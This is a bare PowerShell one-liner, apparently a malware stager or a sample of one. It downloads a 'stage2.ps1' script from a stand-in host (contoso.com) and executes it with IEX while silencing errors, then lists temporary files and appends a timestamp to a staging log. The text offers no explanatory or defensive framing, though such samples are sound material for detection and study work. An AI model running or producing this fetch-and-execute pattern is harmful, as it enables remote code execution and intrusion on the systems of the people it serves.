
$DownloadUrl = "http://contoso.com/stage2.ps1"; IEX (Invoke-WebRequest -Uri $DownloadUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
